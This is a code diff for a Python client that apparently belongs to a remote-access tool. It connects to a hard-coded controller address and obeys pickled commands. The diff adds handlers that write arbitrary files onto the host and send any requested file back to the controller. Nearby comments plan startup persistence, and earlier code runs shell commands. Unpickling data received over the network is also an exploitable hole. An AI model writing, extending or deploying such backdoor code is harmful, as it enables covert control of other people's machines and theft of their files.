@@ -9,6 +9,7 @@ home = ('192.168.0.224', 5000) #192.168.0.224
 conn = None
 #encryptor = PKCS1_OAEP.new(RSA.import_key(open('pub.pem').read()))
 conn_open = False
+buf_size = 4096
 #maybe use https://stackoverflow.com/questions/26160900/is-there-a-way-to-add-a-task-to-the-windows-task-scheduler-via-python-3 to "add to startup" or run cmds?
 def get_size(b, s="B"):
     f = 1024
@@ -20,7 +21,6 @@ def get_size(b, s="B"):
 def send(msg):
     #msg = encryptor.encrypt(pickle.dumps(msg))
     msg = pickle.dumps({'exit': msg[0], 'msg': msg[1]}, -1)
-
     conn.sendall(pickle.dumps({'incoming': len(msg)}))
     conn.sendall(msg)
 
@@ -91,6 +91,33 @@ def run():
                             response = 0, {'output': line, 'working': True, 'loc': os.getcwd()}
                             send(response)
                         response = 0, {'output': proc.returncode, 'loc': os.getcwd()}'''
+                elif cmd['type'] == 'upload':
+                    expected_size = cmd['size']
+                    msg = []
+                    while expected_size > 0:
+                        tmp_part = conn.recv(min(expected_size, buf_size))
+                        if not tmp_part:
+                            raise Exception('Unexpected EOF')
+                        msg.append(tmp_part)
+                        expected_size -= len(tmp_part)
+                    msg = b''.join(msg)
+                    msg = pickle.loads(msg)
+                    try:
+                        with open(msg['loc'], 'wb') as f:
+                            f.write(msg['content'])
+                        response = 0, 'File saved successfully'
+                    except PermissionError:
+                        response = 1, 'Permission denied'
+                elif cmd['type'] == 'download':
+                    try:
+                        with open(cmd['file'], 'rb') as f:
+                            response = 0, f.read()
+                    except MemoryError:
+                        response = 1, 'Memory error'
+                    except PermissionError:
+                        response = 1, 'Permission denied'
+                    except FileNotFoundError:
+                        response = 1, 'File not found'
                 elif cmd['type'] == 'getfiles':
                     if os.path.isdir(cmd['loc']):
                         response = ''
